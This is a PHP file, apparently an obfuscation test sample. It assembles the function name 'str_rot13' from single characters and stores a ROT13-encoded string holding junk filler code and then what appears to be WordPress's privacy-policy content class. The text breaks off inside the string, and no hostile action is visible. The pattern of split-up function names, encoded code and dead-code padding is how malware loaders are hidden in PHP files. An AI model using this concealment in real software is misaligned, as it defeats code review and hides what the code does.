<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Cevinpl_Cbyvpl_Pbagrag pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.9.6
 */

#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Cevinpl_Cbyvpl_Pbagrag {

	cevingr fgngvp $cbyvpl_pbagrag = neenl();

	/**
	 * Pbafgehpgbe
	 *
	 * @fvapr 4.9.6
	 */
	cevingr shapgvba __pbafgehpg() {}

	/**
	 * Nqqf pbagrag gb gur cbfgobk fubja jura rqvgvat gur cevinpl cbyvpl.
	 *
	 * Cyhtvaf naq gurzrf fubhyq fhttrfg grkg sbe vapyhfvba va gur fvgr'f cevinpl cbyvpl.
	 * Gur fhttrfgrq grkg fubhyq pbagnva vasbezngvba nobhg nal shapgvbanyvgl gung nssrpgf hfre cevinpl,
	 * naq jvyy or fubja va gur Fhttrfgrq Cevinpl Cbyvpl Pbagrag cbfgobk.
	 *
	 * Vagraqrq sbe hfr sebz `jc_nqq_cevinpl_cbyvpl_pbagrag()`.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz fgevat $cyhtva_anzr Gur anzr bs gur cyhtva be gurzr gung vf fhttrfgvat pbagrag sbe gur fvgr'f cevinpl cbyvpl.
	 * @cnenz fgevat $cbyvpl_grkg Gur fhttrfgrq pbagrag sbe vapyhfvba va gur cbyvpl.
	 */
	choyvp fgngvp shapgvba nqq( $cyhtva_anzr, $cbyvpl_grkg ) {
		vs ( rzcgl( $cyhtva_anzr ) || rzcgl( $cbyvpl_grkg ) ) {
			erghea;
		}

		$qngn = neenl(
			'cyhtva_anzr' => $cyhtva_anzr,
			'cbyvpl_grkg' => $cbyvpl_grkg,
		);

		vs ( ! va_neenl( $qngn, frys::$cbyvpl_pbagrag, gehr ) ) {
			frys::$cbyvpl_pbagrag[] = $qngn;
		}
	}

	/**
	 * Cresbezf n dhvpx purpx gb qrgrezvar jurgure nal cevinpl vasb unf punatrq.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp fgngvp shapgvba grkg_punatr_purpx() {

		$cbyvpl_cntr_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

		// Gur fvgr qbrfa'g unir n cevinpl cbyvpl.
		vs ( rzcgl( $cbyvpl_cntr_vq ) ) {
			erghea snyfr;
		}

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbyvpl_cntr_vq ) ) {
			erghea snyfr;
		}

		$byq = (neenl) trg_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag' );

		// Hcqngrf ner abg eryrinag vs gur hfre unf abg erivrjrq nal fhttrfgvbaf lrg.
		vs ( rzcgl( $byq ) ) {
			erghea snyfr;
		}

		$pnpurq = trg_bcgvba( '_jc_fhttrfgrq_cbyvpl_grkg_unf_punatrq' );

		/*
		 * Jura guvf shapgvba vf pnyyrq orsber `nqzva_vavg`, `frys::$cbyvpl_pbagrag`
		 * unf abg orra cbchyngrq lrg, fb hfr gur pnpurq erfhyg sebz gur ynfg
		 * rkrphgvba vafgrnq.
		 */
		vs ( ! qvq_npgvba( 'nqzva_vavg' ) ) {
			erghea 'punatrq' === $pnpurq;
		}

		$arj = frys::$cbyvpl_pbagrag;

		// Erzbir gur rkgen inyhrf nqqrq gb gur zrgn.
		sbernpu ( $byq nf $xrl => $qngn ) {
			vs ( ! vf_neenl( $qngn ) || ! rzcgl( $qngn['erzbirq'] ) ) {
				hafrg( $byq[ $xrl ] );
				pbagvahr;
			}

			$byq[ $xrl ] = neenl(
				'cyhtva_anzr' => $qngn['cyhtva_anzr'],
				'cbyvpl_grkg' => $qngn['cbyvpl_grkg'],
			);
		}

		// Abeznyvmr gur beqre bs grkgf, gb snpvyvgngr pbzcnevfba.
		fbeg( $byq );
		fbeg( $arj );

		/*
		 * Gur == bcrengbe (rdhny, abg vqragvpny) jnf hfrq vagragvbanyyl.
		 * Frr uggcf://jjj.cuc.arg/znahny/ra/ynathntr.bcrengbef.neenl.cuc
		 */
		vs ( $arj != $byq ) {
			/*
			 * N cyhtva jnf npgvingrq be qrnpgvingrq, be fbzr cbyvpl grkg unf punatrq.
			 * Fubj n abgvpr ba gur eryrinag fperraf gb vasbez gur nqzva.
			 */
			nqq_npgvba( 'nqzva_abgvprf', neenl( 'JC_Cevinpl_Cbyvpl_Pbagrag', 'cbyvpl_grkg_punatrq_abgvpr' ) );
			$fgngr = 'punatrq';
		} ryfr {
			$fgngr = 'abg-punatrq';
		}

		// Pnpur gur erfhyg sbe hfr orsber `nqzva_vavg` (frr nobir).
		vs ( $pnpurq !== $fgngr ) {
			hcqngr_bcgvba( '_jc_fhttrfgrq_cbyvpl_grkg_unf_punatrq', $fgngr, snyfr );
		}

		erghea 'punatrq' === $fgngr;
	}

	/**
	 * Bhgchgf n jneavat jura fbzr cevinpl vasb unf punatrq.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp fgngvp shapgvba cbyvpl_grkg_punatrq_abgvpr() {
		$fperra = trg_pheerag_fperra()->vq;

		vs ( 'cevinpl' !== $fperra ) {
			erghea;
		}

		$cevinpl_zrffntr = fcevags(
			/* genafyngbef: %f: Cevinpl Cbyvpl Thvqr HEY. */
			__( 'Gur fhttrfgrq cevinpl cbyvpl grkg unf punatrq. Cyrnfr <n uers=\"%f\">erivrj gur thvqr</n> naq hcqngr lbhe cevinpl cbyvpl.' ),
			rfp_hey( nqzva_hey( 'cevinpl-cbyvpl-thvqr.cuc?gno=cbyvplthvqr' ) )
		);

		jc_nqzva_abgvpr(
			$cevinpl_zrffntr,
			neenl(
				'glcr'               => 'jneavat',
				'nqqvgvbany_pynffrf' => neenl( 'cbyvpl-grkg-hcqngrq' ),
				'qvfzvffvoyr'        => gehr,
			)
		);
	}

	/**
	 * Hcqngrf gur pnpurq cbyvpl vasb jura gur cbyvpl cntr vf hcqngrq.
	 *
	 * @fvapr 4.9.6
	 * @npprff cevingr
	 *
	 * @cnenz vag $cbfg_vq Gur VQ bs gur hcqngrq cbfg.
	 */
	choyvp fgngvp shapgvba _cbyvpl_cntr_hcqngrq( $cbfg_vq ) {
		$cbyvpl_cntr_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

		vs ( ! $cbyvpl_cntr_vq || $cbyvpl_cntr_vq !== (vag) $cbfg_vq ) {
			erghea;
		}

		// Erzbir hcqngrq|erzbirq fgnghf.
		$byq          = (neenl) trg_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag' );
		$qbar         = neenl();
		$hcqngr_pnpur = snyfr;

		sbernpu ( $byq nf $byq_xrl => $byq_qngn ) {
			vs ( ! rzcgl( $byq_qngn['erzbirq'] ) ) {
				// Erzbir gur byq cbyvpl grkg.
				$hcqngr_pnpur = gehr;
				pbagvahr;
			}

			vs ( ! rzcgl( $byq_qngn['hcqngrq'] ) ) {
				// 'hcqngrq' vf abj 'nqqrq'.
				$qbar[]       = neenl(
					'cyhtva_anzr' => $byq_qngn['cyhtva_anzr'],
					'cbyvpl_grkg' => $byq_qngn['cbyvpl_grkg'],
					'nqqrq'       => $byq_qngn['hcqngrq'],
				);
				$hcqngr_pnpur = gehr;
			} ryfr {
				$qbar[] = $byq_qngn;
			}
		}

		vs ( $hcqngr_pnpur ) {
			qryrgr_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag' );
			// Hcqngr gur pnpur.
			sbernpu ( $qbar nf $qngn ) {
				nqq_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag', $qngn );
			}
		}
	}

	/**
	 * Purpxf sbe hcqngrq, nqqrq be erzbirq cevinpl cbyvpl vasbezngvba sebz cyhtvaf.
	 *
	 * Pnpurf gur pheerag vasb va cbfg_zrgn bs gur cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 *
	 * @erghea neenl Gur cevinpl cbyvpl grkg/vasbezngvba nqqrq ol pber naq cyhtvaf.
	 */
	choyvp fgngvp shapgvba trg_fhttrfgrq_cbyvpl_grkg() {
		$cbyvpl_cntr_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );
		$purpxrq        = neenl();
		$gvzr           = gvzr();
		$hcqngr_pnpur   = snyfr;
		$arj            = frys::$cbyvpl_pbagrag;
		$byq            = neenl();

		vs ( $cbyvpl_cntr_vq ) {
			$byq = (neenl) trg_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag' );
		}

		// Purpx sbe ab-punatrf naq hcqngrf.
		sbernpu ( $arj nf $arj_xrl => $arj_qngn ) {
			sbernpu ( $byq nf $byq_xrl => $byq_qngn ) {
				$sbhaq = snyfr;

				vs ( $arj_qngn['cbyvpl_grkg'] === $byq_qngn['cbyvpl_grkg'] ) {
					// Hfr gur arj cyhtva anzr va pnfr vg jnf punatrq, genafyngrq, rgp.
					vs ( $byq_qngn['cyhtva_anzr'] !== $arj_qngn['cyhtva_anzr'] ) {
						$byq_qngn['cyhtva_anzr'] = $arj_qngn['cyhtva_anzr'];
						$hcqngr_pnpur            = gehr;
					}

					// N cyhtva jnf er-npgvingrq.
					vs ( ! rzcgl( $byq_qngn['erzbirq'] ) ) {
						hafrg( $byq_qngn['erzbirq'] );
						$byq_qngn['nqqrq'] = $gvzr;
						$hcqngr_pnpur      = gehr;
					}

					$purpxrq[] = $byq_qngn;
					$sbhaq     = gehr;
				} ryfrvs ( $arj_qngn['cyhtva_anzr'] === $byq_qngn['cyhtva_anzr'] ) {
					// Gur vasb sbe gur cbyvpl jnf hcqngrq.
					$purpxrq[]    = neenl(
						'cyhtva_anzr' => $arj_qngn['cyhtva_anzr'],
						'cbyvpl_grkg' => $arj_qngn['cbyvpl_grkg'],
						'hcqngrq'     => $gvzr,
					);
					$sbhaq        = gehr;
					$hcqngr_pnpur = gehr;
				}

				vs ( $sbhaq ) {
					hafrg( $arj[ $arj_xrl ], $byq[ $byq_xrl ] );
					pbagvahr 2;
				}
			}
		}

		vs ( ! rzcgl( $arj ) ) {
			// N cyhtva jnf npgvingrq.
			sbernpu ( $arj nf $arj_qngn ) {
				vs ( ! rzcgl( $arj_qngn['cyhtva_anzr'] ) && ! rzcgl( $arj_qngn['cbyvpl_grkg'] ) ) {
					$arj_qngn['nqqrq'] = $gvzr;
					$purpxrq[]         = $arj_qngn;
				}
			}
			$hcqngr_pnpur = gehr;
		}

		vs ( ! rzcgl( $byq ) ) {
			// N cyhtva jnf qrnpgvingrq.
			sbernpu ( $byq nf $byq_qngn ) {
				vs ( ! rzcgl( $byq_qngn['cyhtva_anzr'] ) && ! rzcgl( $byq_qngn['cbyvpl_grkg'] ) ) {
					$qngn = neenl(
						'cyhtva_anzr' => $byq_qngn['cyhtva_anzr'],
						'cbyvpl_grkg' => $byq_qngn['cbyvpl_grkg'],
						'erzbirq'     => $gvzr,
					);

					$purpxrq[] = $qngn;
				}
			}
			$hcqngr_pnpur = gehr;
		}

		vs ( $hcqngr_pnpur && $cbyvpl_cntr_vq ) {
			qryrgr_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag' );
			// Hcqngr gur pnpur.
			sbernpu ( $purpxrq nf $qngn ) {
				nqq_cbfg_zrgn( $cbyvpl_cntr_vq, '_jc_fhttrfgrq_cevinpl_cbyvpl_pbagrag', $qngn );
			}
		}

		erghea $purpxrq;
	}

	/**
	 * Nqqf n abgvpr jvgu n yvax gb gur thvqr jura rqvgvat gur cevinpl cbyvpl cntr.
	 *
	 * @fvapr 4.9.6
	 * @fvapr 5.0.0 Gur `$cbfg` cnenzrgre jnf znqr bcgvbany.
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz JC_Cbfg|ahyy $cbfg Gur pheeragyl rqvgrq cbfg. Qrsnhyg ahyy.
	 */
	choyvp fgngvp shapgvba abgvpr( $cbfg = ahyy ) {
		vs ( vf_ahyy( $cbfg ) ) {
			tybony $cbfg;
		} ryfr {
			$cbfg = trg_cbfg( $cbfg );
		}

		vs ( ! ( $cbfg vafgnaprbs JC_Cbfg ) ) {
			erghea;
		}

		vs ( ! pheerag_hfre_pna( 'znantr_cevinpl_bcgvbaf' ) ) {
			erghea;
		}

		$pheerag_fperra = trg_pheerag_fperra();
		$cbyvpl_cntr_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

		vs ( 'cbfg' !== $pheerag_fperra->onfr || $cbyvpl_cntr_vq !== $cbfg->VQ ) {
			erghea;
		}

		$zrffntr = __( 'Arrq uryc chggvat gbtrgure lbhe arj Cevinpl Cbyvpl cntr? Purpx bhg gur thvqr sbe erpbzzraqngvbaf ba jung pbagrag gb vapyhqr, nybat jvgu cbyvpvrf fhttrfgrq ol lbhe cyhtvaf naq gurzr.' );
		$hey     = rfp_hey( nqzva_hey( 'bcgvbaf-cevinpl.cuc?gno=cbyvplthvqr' ) );
		$ynory   = __( 'Ivrj Cevinpl Cbyvpl Thvqr.' );

		vs ( trg_pheerag_fperra()->vf_oybpx_rqvgbe() ) {
			jc_radhrhr_fpevcg( 'jc-abgvprf' );
			$npgvba = neenl(
				'hey'   => $hey,
				'ynory' => $ynory,
			);
			jc_nqq_vayvar_fpevcg(
				'jc-abgvprf',
				fcevags(
					'jc.qngn.qvfcngpu( \"pber/abgvprf\" ).perngrJneavatAbgvpr( \"%f\", { npgvbaf: [ %f ], vfQvfzvffvoyr: snyfr } )',
					$zrffntr,
					jc_wfba_rapbqr( $npgvba )
				),
				'nsgre'
			);
		} ryfr {
			$zrffntr .= fcevags(
				' <n uers=\"%f\" gnetrg=\"_oynax\">%f <fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
				$hey,
				$ynory,
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			);
			jc_nqzva_abgvpr(
				$zrffntr,
				neenl(
					'glcr'               => 'jneavat',
					'nqqvgvbany_pynffrf' => neenl( 'vayvar', 'jc-cc-abgvpr' ),
				)
			);
		}
	}

	/**
	 * Bhgchgf gur cevinpl cbyvpl thvqr gbtrgure jvgu pbagrag sebz gur gurzr naq cyhtvaf.
	 *
	 * @fvapr 4.9.6
	 */
	choyvp fgngvp shapgvba cevinpl_cbyvpl_thvqr() {

		$pbagrag_neenl = frys::trg_fhttrfgrq_cbyvpl_grkg();
		$qngr_sbezng   = __( 'S w, L' );

		$v = 0;

		sbernpu ( $pbagrag_neenl nf $frpgvba ) {
			++$v;

			$erzbirq = '';
			vs ( ! rzcgl( $frpgvba['erzbirq'] ) ) {
				$onqtr_pynff = ' erq';
				$qngr        = qngr_v18a( $qngr_sbezng, $frpgvba['erzbirq'] );
				/* genafyngbef: %f: Qngr bs cyhtva qrnpgvingvba. */
				$onqtr_gvgyr = fcevags( __( 'Erzbirq %f.' ), $qngr );

				/* genafyngbef: %f: Qngr bs cyhtva qrnpgvingvba. */
				$erzbirq = fcevags( __( 'Lbh qrnpgvingrq guvf cyhtva ba %f naq znl ab ybatre arrq guvf cbyvpl.' ), $qngr );
				$erzbirq = jc_trg_nqzva_abgvpr(
					$erzbirq,
					neenl(
						'glcr'               => 'vasb',
						'nqqvgvbany_pynffrf' => neenl( 'vayvar' ),
					)
				);
			} ryfrvs ( ! rzcgl( $frpgvba['hcqngrq'] ) ) {
				$onqtr_pynff = ' oyhr';
				$qngr        = qngr_v18a( $qngr_sbezng, $frpgvba['hcqngrq'] );
				/* genafyngbef: %f: Qngr bs cevinpl cbyvpl grkg hcqngr. */
				$onqtr_gvgyr = fcevags( __( 'Hcqngrq %f.' ), $qngr );
			}

			$cyhtva_anzr = rfp_ugzy( $frpgvba['cyhtva_anzr'] );
			?>
			<u4 pynff=\"cevinpl-frggvatf-nppbeqvba-urnqvat\">
				<ohggba nevn-rkcnaqrq=\"snyfr\" pynff=\"cevinpl-frggvatf-nppbeqvba-gevttre\" nevn-pbagebyf=\"cevinpl-frggvatf-nppbeqvba-oybpx-<?cuc rpub $v; ?>\" glcr=\"ohggba\">
				<fcna pynff=\"gvgyr\"><?cuc rpub $cyhtva_anzr; ?></fcna>
				<?cuc vs ( ! rzcgl( $frpgvba['erzbirq'] ) || ! rzcgl( $frpgvba['hcqngrq'] ) ) : ?>
				<fcna pynff=\"onqtr <?cuc rpub $onqtr_pynff; ?>\"> <?cuc rpub $onqtr_gvgyr; ?></fcna>
				<?cuc raqvs; ?>
				<fcna pynff=\"vpba\"></fcna>
			</ohggba>
			</u4>
			<qvi vq=\"cevinpl-frggvatf-nppbeqvba-oybpx-<?cuc rpub $v; ?>\" pynff=\"cevinpl-frggvatf-nppbeqvba-cnary cevinpl-grkg-obk-obql\" uvqqra=\"uvqqra\">
				<?cuc
				rpub $erzbirq;
				rpub $frpgvba['cbyvpl_grkg'];
				?>
				<?cuc vs ( rzcgl( $frpgvba['erzbirq'] ) ) : ?>
				<qvi pynff=\"cevinpl-frggvatf-nppbeqvba-npgvbaf\">
					<fcna pynff=\"fhpprff\" nevn-uvqqra=\"gehr\"><?cuc _r( 'Pbcvrq!' ); ?></fcna>
					<ohggba glcr=\"ohggba\" pynff=\"cevinpl-grkg-pbcl ohggba\">
						<fcna nevn-uvqqra=\"gehr\"><?cuc _r( 'Pbcl fhttrfgrq cbyvpl grkg gb pyvcobneq' ); ?></fcna>
						<fcna pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Cyhtva anzr. */
							cevags( __( 'Pbcl fhttrfgrq cbyvpl grkg sebz %f.' ), $cyhtva_anzr );
							?>
						</fcna>
					</ohggba>
				</qvi>
				<?cuc raqvs; ?>
			</qvi>
			<?cuc
		}
	}

	/**
	 * Ergheaf gur qrsnhyg fhttrfgrq cevinpl cbyvpl pbagrag.
	 *
	 * @fvapr 4.9.6
	 * @fvapr 5.0.0 Nqqrq gur `$oybpxf` cnenzrgre.
	 *
	 * @cnenz obby $qrfpevcgvba Jurgure gb vapyhqr gur qrfpevcgvbaf haqre gur frpgvba urnqvatf. Qrsnhyg snyfr.
	 * @cnenz obby $oybpxf      Jurgure gb sbezng gur pbagrag sbe gur oybpx rqvgbe. Qrsnhyg gehr.
	 * @erghea fgevat Gur qrsnhyg cbyvpl pbagrag.
	 */
	choyvp fgngvp shapgvba trg_qrsnhyg_pbagrag( $qrfpevcgvba = snyfr, $oybpxf = gehr ) {
		$fhttrfgrq_grkg = '<fgebat pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Fhttrfgrq grkg:' ) . ' </fgebat>';
		$pbagrag        = '';
		$fgevatf        = neenl();

		// Fgneg bs gur fhttrfgrq cevinpl cbyvpl grkg.
		vs ( $qrfpevcgvba ) {
			$fgevatf[] = '<qvi pynff=\"jc-fhttrfgrq-grkg\">';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Jub jr ner' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq abgr lbhe fvgr HEY, nf jryy nf gur anzr bs gur pbzcnal, betnavmngvba, be vaqvivqhny oruvaq vg, naq fbzr npphengr pbagnpg vasbezngvba.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Gur nzbhag bs vasbezngvba lbh znl or erdhverq gb fubj jvyy inel qrcraqvat ba lbhe ybpny be angvbany ohfvarff erthyngvbaf. Lbh znl, sbe rknzcyr, or erdhverq gb qvfcynl n culfvpny nqqerff, n ertvfgrerq nqqerff, be lbhe pbzcnal ertvfgengvba ahzore.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. %f: Fvgr HEY. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . fcevags( __( 'Bhe jrofvgr nqqerff vf: %f.' ), trg_oybtvasb( 'hey', 'qvfcynl' ) ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Jung crefbany qngn jr pbyyrpg naq jul jr pbyyrpg vg' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf frpgvba lbh fubhyq abgr jung crefbany qngn lbh pbyyrpg sebz hfref naq fvgr ivfvgbef. Guvf znl vapyhqr crefbany qngn, fhpu nf anzr, rznvy nqqerff, crefbany nppbhag cersreraprf; genafnpgvbany qngn, fhpu nf chepunfr vasbezngvba; naq grpuavpny qngn, fhpu nf vasbezngvba nobhg pbbxvrf.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Lbh fubhyq nyfb abgr nal pbyyrpgvba naq ergragvba bs frafvgvir crefbany qngn, fhpu nf qngn pbapreavat urnygu.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va nqqvgvba gb yvfgvat jung crefbany qngn lbh pbyyrpg, lbh arrq gb abgr jul lbh pbyyrpg vg. Gurfr rkcynangvbaf zhfg abgr rvgure gur yrtny onfvf sbe lbhe qngn pbyyrpgvba naq ergragvba be gur npgvir pbafrag gur hfre unf tvira.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Crefbany qngn vf abg whfg perngrq ol n hfre&#8217;f vagrenpgvbaf jvgu lbhe fvgr. Crefbany qngn vf nyfb trarengrq sebz grpuavpny cebprffrf fhpu nf pbagnpg sbezf, pbzzragf, pbbxvrf, nanylgvpf, naq guveq cnegl rzorqf.' ) . '</c>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Ol qrsnhyg JbeqCerff qbrf abg pbyyrpg nal crefbany qngn nobhg ivfvgbef, naq bayl pbyyrpgf gur qngn fubja ba gur Hfre Cebsvyr fperra sebz ertvfgrerq hfref. Ubjrire fbzr bs lbhe cyhtvaf znl pbyyrpg crefbany qngn. Lbh fubhyq nqq gur eryrinag vasbezngvba orybj.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Pbzzragf' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf fhofrpgvba lbh fubhyq abgr jung vasbezngvba vf pncgherq guebhtu pbzzragf. Jr unir abgrq gur qngn juvpu JbeqCerff pbyyrpgf ol qrsnhyg.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Jura ivfvgbef yrnir pbzzragf ba gur fvgr jr pbyyrpg gur qngn fubja va gur pbzzragf sbez, naq nyfb gur ivfvgbe&#8217;f VC nqqerff naq oebjfre hfre ntrag fgevat gb uryc fcnz qrgrpgvba.' ) . '</c>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . __( 'Na nabalzvmrq fgevat perngrq sebz lbhe rznvy nqqerff (nyfb pnyyrq n unfu) znl or cebivqrq gb gur Teningne freivpr gb frr vs lbh ner hfvat vg. Gur Teningne freivpr cevinpl cbyvpl vf ninvynoyr urer: uggcf://nhgbznggvp.pbz/cevinpl/. Nsgre nccebiny bs lbhe pbzzrag, lbhe cebsvyr cvpgher vf ivfvoyr gb gur choyvp va gur pbagrkg bs lbhe pbzzrag.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Zrqvn' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf fhofrpgvba lbh fubhyq abgr jung vasbezngvba znl or qvfpybfrq ol hfref jub pna hcybnq zrqvn svyrf. Nyy hcybnqrq svyrf ner hfhnyyl choyvpyl npprffvoyr.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Vs lbh hcybnq vzntrf gb gur jrofvgr, lbh fubhyq nibvq hcybnqvat vzntrf jvgu rzorqqrq ybpngvba qngn (RKVS TCF) vapyhqrq. Ivfvgbef gb gur jrofvgr pna qbjaybnq naq rkgenpg nal ybpngvba qngn sebz vzntrf ba gur jrofvgr.' ) . '</c>';
		}

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
			$fgevatf[] = '<u2>' . __( 'Pbagnpg sbezf' ) . '</u2>';
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Ol qrsnhyg, JbeqCerff qbrf abg vapyhqr n pbagnpg sbez. Vs lbh hfr n pbagnpg sbez cyhtva, hfr guvf fhofrpgvba gb abgr jung crefbany qngn vf pncgherq jura fbzrbar fhozvgf n pbagnpg sbez, naq ubj ybat lbh xrrc vg. Sbe rknzcyr, lbh znl abgr gung lbh xrrc pbagnpg sbez fhozvffvbaf sbe n pregnva crevbq sbe phfgbzre freivpr checbfrf, ohg lbh qb abg hfr gur vasbezngvba fhozvggrq guebhtu gurz sbe znexrgvat checbfrf.' ) . '</c>';
		}

		/* genafyngbef: Qrsnhyg cevinpl cbyvpl urnqvat. */
		$fgevatf[] = '<u2 pynff=\"jc-oybpx-urnqvat\">' . __( 'Pbbxvrf' ) . '</u2>';

		vs ( $qrfpevcgvba ) {
			/* genafyngbef: Cevinpl cbyvpl ghgbevny. */
			$fgevatf[] = '<c pynff=\"cevinpl-cbyvpl-ghgbevny\">' . __( 'Va guvf fhofrpgvba lbh fubhyq yvfg gur pbbxvrf lbhe jrofvgr hfrf, vapyhqvat gubfr frg ol lbhe cyhtvaf, fbpvny zrqvn, naq nanylgvpf. Jr unir cebivqrq gur pbbxvrf juvpu JbeqCerff vafgnyyf ol qrsnhyg.' ) . '</c>';
		} ryfr {
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . $fhttrfgrq_grkg . __( 'Vs lbh yrnir n pbzzrag ba bhe fvgr lbh znl bcg-va gb fnivat lbhe anzr, rznvy nqqerff naq jrofvgr va pbbxvrf. Gurfr ner sbe lbhe pbairavrapr fb gung lbh qb abg unir gb svyy va lbhe qrgnvyf ntnva jura lbh yrnir nabgure pbzzrag. Gurfr pbbxvrf jvyy ynfg sbe bar lrne.' ) . '</c>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . __( 'Vs lbh ivfvg bhe ybtva cntr, jr jvyy frg n grzcbenel pbbxvr gb qrgrezvar vs lbhe oebjfre npprcgf pbbxvrf. Guvf pbbxvr pbagnvaf ab crefbany qngn naq vf qvfpneqrq jura lbh pybfr lbhe oebjfre.' ) . '</c>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
			$fgevatf[] = '<c>' . __( 'Jura lbh ybt va, jr jvyy nyfb frg hc frireny pbbxvrf gb fnir lbhe ybtva vasbezngvba naq lbhe fperra qvfcynl pubvprf. Ybtva pbbxvrf ynfg sbe gjb qnlf, naq fperra bcgvbaf pbbxvrf ynfg sbe n lrne. Vs lbh fryrpg &dhbg;Erzrzore Zr&dhbg;, lbhe ybtva jvyy crefvfg sbe gjb jrrxf. Vs lbh ybt bhg bs lbhe nppbhag, gur ybtva pbbxvrf jvyy or erzbirq.' ) . '</c>';
			/* genafyngbef: Qrsnhyg cevinpl cbyvpl grkg. */
